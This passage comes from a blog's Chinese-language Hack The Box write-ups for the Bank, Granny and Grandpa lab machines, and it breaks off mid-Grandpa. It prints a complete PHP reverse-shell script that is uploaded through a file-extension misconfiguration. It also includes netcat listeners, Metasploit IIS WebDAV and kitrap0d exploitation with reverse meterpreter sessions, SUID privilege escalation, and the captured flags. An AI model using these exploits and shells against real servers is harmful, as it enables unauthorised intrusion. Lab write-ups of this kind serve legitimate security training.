F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A\nOS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   991.53 ms 10.10.16.1\n2   233.51 ms 10.10.10.29\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 190.30 seconds\n```\n## Http\n![](Hackthebox-Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png)\n\n直接访问 ip 地址，会进入 apache 的默认页面，同时我们看到 53 端口打开着，很典型的 DNS 服务器，添加一个解析\n\n```bash\necho 10.10.10.29 bank.htb\n```\n然后去访问一下\n\n![](Hackthebox-Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png)\n\n这就有页面了，去 fuzz 一下目录\n\n## Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://bank.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://bank.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nuploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]\nassets                  [Status: 301, Size: 304, Words: 20, Lines: 10]\ninc                     [Status: 301, Size: 301, Words: 20, Lines: 10]\nbalance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]\n```\n前三个都没东西，咱们去看看第四个 `balance-transfer` \n\n![](Hackthebox-Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png)\n\n有很多的 `.acc` 结尾的文件，去看一个\n\n![](Hackthebox-Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png)\n\n这看起来像是存储的用户数据，但是都是加密的，我尝试了一下也无法解密出来，多找找看\n\n```bash\nimport requests\nimport re\n\nresponse = requests.get(\"http://bank.htb/balance-transfer/\")\nhtml = response.text\nurls = re.findall('<a href=\"(.*?acc)\">.*?acc</a>', html)\nx = 1\ny = len(urls) - 1\nfor url in urls:\n    url = 'http://bank.htb/balance-transfer/' + url\n    name = url.split('/')[-1]\n    response = requests.get(url)\n    with open(name, \"wb\") as f:\n        f.write(response.content)\n        print('【%s】 下载完毕 当前完成任务：%s 次 还剩任务 %s 次' % (url, x, y))\n        x += 1\n        y -= 1\n```\n由于数量有点多，所以我写了个简单的爬虫来自动下载文件\n\n![](Hackthebox-Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png)\n\n一共 999 个用户，下载下来看看有没有没有加密的漏网之鱼\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]\n└─# grep -r 'bank.htb' ./                                                        \n./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb\n```\n爬虫爬完了，搜索一下有没有 `bank.htb` 邮箱的内容，还真搜到了一个\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]\n└─# cat 68576f20e9732f1b2edc4df5b8533230.acc                                                                     \n--ERR ENCRYPT FAILED\n+=================+\n| HTB Bank Report |\n+=================+\n\n===UserAccount===\nFull Name: Christos Christopoulos\nEmail: chris@bank.htb\nPassword: !##HTBB4nkP4ssw0rd!##\nCreditCards: 5\nTransactions: 39\nBalance: 8842803 .\n===UserAccount===\n```\n查看一下内容，成功拿到一个可以用的账号密码\n\n去登录一下后台看看\n\n![](Hackthebox-Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png)\n\n成功进入后台\n\n![](Hackthebox-Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png)\n\n主页上没什么功能点，就一个支持，然后在支持里面有一个文件上传功能，我尝试了一下直接上传 phpwebshell，上传失败。我们去看看网页源码\n\n![](Hackthebox-Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png)\n\n在 95 行发现这么一句\n\n将会把 `.htb` 格式的文件以 `.php` 格式来运行，OK，思路有了\n\n# 漏洞利用\n```bash\n<?php\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.10.16.4';  // CHANGE THIS\n$port = 4444;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/bash -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?>\n```\n![](Hackthebox-Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png)\n\n将我们的 phpshell 的后缀更改为 `.htb` 然后去上传\n\n然后使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png)\n\n传上去以后，点一下附件\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458\nLinux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux\n 05:08:13 up 20:18,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1072): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@bank:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功拿到一个 shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Z 返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n修复一下 shell\n\n# 权限提升\n```bash\nfind / -user root -perm -4000 -print 2>/dev/null\n```\n搜索一下我们可以用来提升权限的 SUID 文件\n\n```bash\nwww-data@bank:/$ find / -user root -perm -4000 -print 2>/dev/null\n/var/htb/bin/emergency\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/traceroute6.iputils\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/mtr\n/usr/sbin/pppd\n/bin/ping\n/bin/ping6\n/bin/su\n/bin/fusermount\n/bin/mount\n/bin/umount\n```\n第一个文件一看就不简单，去运行一下\n\n```bash\nwww-data@bank:/$ /var/htb/bin/emergency\n# ls\nbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old\n# whoami\nroot\n```\n直接就 root 了？我不是很理解原理\n\n```bash\n# cat /home/chris/user.txt\n20575ef51ddd60d74b616251bc305319\n```\n拿到了 user 权限的 flag 文件\n\n```bash\n# cat /root/root.txt\n9e6410fc2696f73f668c5dde1f5d0d99\n```\n拿到了 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Granny - Hackthebox","url":"/2022/03/29/Hackthebox/Easy/Hackthebox-Granny/","content":"\n# Hackthebox - Granny\n# 靶场信息\n![](Hackthebox-Granny/c6d4e9ec-523a-4829-9ddb-48eade9b0e43.png)\n\n# 靶场类型\n![](Hackthebox-Granny/734ce29b-858e-4cdd-bc54-30192bbf6ce6.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Granny]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.15\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 00:33 EDT\nNmap scan report for 10.10.10.15\nHost is up (0.47s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|   Server Type: Microsoft-IIS/6.0\n|   WebDAV type: Unknown\n|_  Server Date: Mon, 28 Mar 2022 04:34:35 GMT\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4\nAggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   598.17 ms 10.10.16.1\n2   598.29 ms 10.10.10.15\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 63.49 seconds\n```\n## Http\n![](Hackthebox-Granny/fa708722-0944-4ac1-a1e6-e3a119aece0b.png)\n\n这台很眼熟啊，和 Grandpa 似乎架构一样，去尝试一下直接打试试\n\n## Metasploit\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options \n\nModule options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   MAXPATHLENGTH  60               yes       End of physical path brute force\n   MINPATHLENGTH  3                yes       Start of physical path brute force\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.15      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80               yes       The target port (TCP)\n   SSL            false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI      /                yes       Path of IIS 6 web application\n   VHOST                           no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Microsoft Windows Server 2003 R2 SP2 x86\n```\n设置好相关的配置，启动\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Trying path length 3 to 60 ...\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.10.10.15:1030) at 2022-03-28 00:39:57 -0400\n\nmeterpreter > getuid\n[-] stdapi_sys_config_getuid: Operation failed: Access is denied.\n```\n似乎连突破点都一样，有点离谱\n\n```bash\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System\n 272   4     smss.exe\n 320   272   csrss.exe\n 344   272   winlogon.exe\n 392   344   services.exe\n 404   344   lsass.exe\n 560   1064  cidaemon.exe\n 584   392   svchost.exe\n 672   392   svchost.exe\n 732   392   svchost.exe\n 772   392   svchost.exe\n 788   392   svchost.exe\n 888   1064  cidaemon.exe\n 924   392   spoolsv.exe\n 952   392   msdtc.exe\n 960   1064  cidaemon.exe\n 1064  392   cisvc.exe\n 1112  392   svchost.exe\n 1168  392   inetinfo.exe\n 1204  392   svchost.exe\n 1312  392   VGAuthService.exe\n 1380  392   vmtoolsd.exe\n 1488  392   svchost.exe\n 1588  392   svchost.exe\n 1760  392   dllhost.exe\n 1856  392   alg.exe\n 1876  584   wmiprvse.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 2252  1488  w3wp.exe           x86   0        NT AUTHORITY\\NETWORK SERVICE  c:\\windows\\system32\\inetsrv\\w3wp.exe\n 2392  584   davcdata.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe\n 2552  584   wmiprvse.exe\n 3792  2252  rundll32.exe       x86   0                                      C:\\WINDOWS\\system32\\rundll32.exe\n\nmeterpreter > migrate 1876\n[*] Migrating from 3792 to 1876...\n[*] Migration completed successfully.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE\n```\n跟 Grandpa 一样的漏洞情况，做一个进程迁移就可以了\n\n现在去提权吧\n\n# 权限提升\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\n设置好 session，去执行\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Launching notepad to host the exploit...\n[+] Process 2088 launched.\n[*] Reflectively injecting the exploit DLL into 2088...\n[*] Injecting exploit into 2088 ...\n[*] Exploit injected. Injecting payload into 2088...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Meterpreter session 2 opened (10.10.16.4:5555 -> 10.10.10.15:1031) at 2022-03-28 00:45:56 -0400\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n成功提权到 root 权限\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\Lakis\\Desktop\\user.txt (32 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\Lakis\\Desktop\\user.txt'\n        700c5dc163014e22b3e408f8703f67d1\nmeterpreter > cat 'c:\\Documents and Settings\\Administrator\\Desktop\\root.txt'\n        aa4beed1c0584445ab463a6747bd06e9\nmeterpreter >\n```\n成功拿到 user 和 root 权限的 flag 文件\n\n这台的情况和 Grandpa 一模一样，没什么好说的","tags":["Hackthebox"]},{"title":"Grandpa - Hackthebox","url":"/2022/03/28/Hackthebox/Easy/Hackthebox-Grandpa/","content":"\n# Hackthebox - Grandpa\n# 靶场信息\n![](Hackthebox-Grandpa/ba430d66-a24b-4a0d-8223-ac94cd49594a.png)\n\n# 靶场类型\n![](Hackthebox-Grandpa/052f67c1-374a-4fc7-b687-06611a9e0814.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Grandpa]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.14\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-25 02:52 EDT\nNmap scan report for 10.10.10.14\nHost is up (0.53s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|   Server Type: Microsoft-IIS/6.0\n|   Server Date: Fri, 25 Mar 2022 06:53:29 GMT\n|   WebDAV type: Unknown\n|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4\nAggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   524.27 ms 10.10.16.1\n2   524.42 ms 10.10.10.14\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.52 seconds\n```\n## Http\n![](Hackthebox-Grandpa/c400ace0-ff4f-481f-a909-af3f8fde64aa.png)\n\n这里提示没有默认页面，去看看是不是 IIS 本身的漏洞吧\n\n## Searchsploit\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit IIS 6.0      \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nMicrosoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                  | windows/remote/21057.txt\nMicrosoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                           | windows/remote/9541.pl\nMicrosoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                             | windows/dos/9587.txt\nMicrosoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                      | windows/dos/3965.pl\nMicrosoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                            | windows/dos/15167.txt\nMicrosoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                          | windows/remote/41738.py\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                           | windows/remote/8765.php\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                       | windows/remote/8704.txt\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                       | windows/remote/8806.pl\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                   | windows/remote/8754.patch\nMicrosoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                          | windows/remote/19033.txt\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n我们看看 Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow 远程缓冲区溢出，感觉有戏\n\n# 漏洞利用\n先去看看 msf 有没有相关的漏洞利用模块\n\n```bash\nmsf6 > search IIS 6.0\n\nMatching Modules\n================\n\n   #  Name                                                 Disclosure Date  Rank    Check  Description\n   -  ----                                                 ---------------  ----    -----  -----------\n   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow\n   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service\n   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow\n\nInteract with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl\n```\n这边确实有一个，去加载一下试试\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options \n\nModule options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   MAXPATHLENGTH  60               yes       End of physical path brute force\n   MINPATHLENGTH  3                yes       Start of physical path brute force\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80               yes       The target port (TCP)\n   SSL            false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI      /                yes       Path of IIS 6 web application\n   VHOST                           no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Microsoft Windows Server 2003 R2 SP2 x86\n```\n设置好相关的配置，然后执行\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Trying path length 3 to 60 ...\n[*] Sending stage (175174 bytes) to 10.10.10.14\n[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.10.10.14:1031) at 2022-03-25 03:31:02 -0400\n\nmeterpreter > shell\n[-] Failed to spawn shell with thread impersonation. Retrying without it.\nProcess 2056 created.\nChannel 2 created.\nMicrosoft Windows [Version 5.2.3790]\n(C) Copyright 1985-2003 Microsoft Corp.\n\nc:\\windows\\system32\\inetsrv>whoami\nwhoami\nnt authority\\network service\n```\n成功拿到一个 shell 不过权限很低\n\n使用 background 返回\n\n# 权限提升\n使用 post/multi/recon/local\\_exploit\\_suggester 进行提权脚本查询\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester\nmsf6 post(multi/recon/local_exploit_suggester) > show options \n\nModule options (post/multi/recon/local_exploit_suggester):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   SESSION                           yes       The session to run this module on\n   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits\n\nmsf6 post(multi/recon/local_exploit_suggester) > set session 2\nsession => 2\n```\n设置好以后，exploit 执行\n\n```bash\nmsf6 post(multi/recon/local_exploit_suggester) > exploit \n\n[*] 10.10.10.14 - Collecting local exploits for x86/windows...\n[*] 10.10.10.14 - 38 exploit checks are being tried...\n[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[*] Post module execution completed\n```\n以上都是当前机器下可能可用的提权模块\n\n```bash\nexploit/windows/local/ms10_015_kitrap0d\n```\n挨个尝试后，都是提示没有权限 “Exploit failed: Rex::Post::Meterpreter::RequestError stdapi\\_sys\\_config\\_getsid: Operation failed: Access is denied.”\n\n```bash\nmeterpreter > getuid\n[-] stdapi_sys_config_getuid: Operation failed: Access is denied.\n```\n直接使用 getuid 命令也是不行的\n\n```bash\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System\n 272   4     smss.exe\n 320   272   csrss.exe\n 344   272   winlogon.exe\n 392   344   services.exe\n 404   344   lsass.exe\n 532   584   davcdata.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe\n 584   392   svchost.exe\n 668   392   svchost.exe\n 732   392   svchost.exe\n 